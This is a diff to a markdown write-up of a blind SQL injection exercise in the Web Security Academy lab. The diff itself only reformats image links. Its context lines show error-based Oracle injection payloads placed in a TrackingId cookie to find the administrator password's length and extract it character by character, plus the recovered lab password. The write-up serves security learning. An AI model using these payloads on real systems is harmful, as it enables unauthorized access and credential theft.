@@ -106,7 +106,7 @@ Cookie: TrackingId=ZrWXzpJw6Bn01yk5'||(SELECT CASE WHEN LENGTH(password)>=§1§ 
 ...
 ```
 This was the result of starting the attack using a numbers payload from 1-50:
-![[Screenshot 2024-05-02 at 4.05.44 PM.png]]
+![Screenshot 2024-05-02 at 4.05.44 PM](images/Screenshot%202024-05-02%20at%204.05.44%20PM.png)
 
 This shows us that the length of the password is 20. 
 
@@ -123,12 +123,12 @@ GET /login HTTP/2
 Host: 0abb003e0491d6398054f83d00900092.web-security-academy.net
 Cookie: TrackingId=ZrWXzpJw6Bn01yk5'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN NULL ELSE to_char(1/0) END FROM users WHERE username ='administrator')--; 
 ```
-![[Screenshot 2024-05-02 at 4.21.17 PM.png]]
-![[Screenshot 2024-05-02 at 4.21.45 PM.png]]
+![Screenshot 2024-05-02 at 4.21.17 PM](images/Screenshot%202024-05-02%20at%204.21.17%20PM.png)
+![Screenshot 2024-05-02 at 4.21.45 PM](images/Screenshot%202024-05-02%20at%204.21.45%20PM.png)
 Once the attack was finished, I sorted the payloads by payload number 1 and by status code 200. 
 Piecing those with status code 200, I received the following password: 
 `7a3jk3m8a3cy05k1jy4o`
 
 Managed to log in successfully!
 
-![[Screenshot 2024-05-02 at 4.30.02 PM.png]]
+![Screenshot 2024-05-02 at 4.30.02 PM](images/Screenshot%202024-05-02%20at%204.30.02%20PM.png)
